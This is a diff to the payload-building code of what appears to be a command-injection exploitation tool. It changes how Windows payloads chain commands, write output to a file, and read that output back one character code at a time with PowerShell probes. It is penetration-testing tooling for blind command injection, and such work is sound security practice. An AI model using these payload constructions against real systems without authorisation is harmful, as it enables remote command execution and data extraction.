@@ -28,14 +28,14 @@ The file's contents as one line of text, joined and trimmed the same way every p
 it, so a length and the characters counted off it always agree.
 """
 def windows_file_text(OUTPUT_TEXTFILE):
-  return "([string](Get-Content " + OUTPUT_TEXTFILE + ")).trim()"
+  return "([string](Get-Content " + OUTPUT_TEXTFILE + ")).TrimEnd()"
 
 """
 A command's output as one line of text. Multi-line output is joined, so a single number describes
 its length however many lines it came in.
 """
 def windows_cmd_text(cmd):
-  return "([string](cmd /c " + cmd + ")).trim()"
+  return checks.windows_output_text(cmd)
 
 def flattened_file_text(OUTPUT_TEXTFILE):
   """
@@ -84,7 +84,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       payload = (chain +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" +
                 checks.windows_probe(checks.WINDOWS_CHAIN,
-                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".length",
+                                     "powershell.exe -InputFormat none write-host " + checks.windows_output_bytes(windows_file_text(OUTPUT_TEXTFILE)) + ".length",
                                      "EQU", j, timesec)
                 )
 
@@ -186,8 +186,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       win_operator = "GEQ" if operator == "-le" else "EQU"
       # Stored as one decimal per character: extraction reads a character off it by number, and
       # their count is the length being searched for.
-      ascii_output = ("powershell.exe -InputFormat none write-host ([int[]][char[]](" +
-                      windows_cmd_text(cmd) + "))")
+      ascii_output = ("powershell.exe -InputFormat none write-host ([int[]](" +
+                      checks.windows_output_bytes(windows_cmd_text(cmd)) + "))")
       payload = (chain +
                 "for /f \"tokens=* eol=\" %i in ('cmd /c \"" + ascii_output + "\"') do " +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
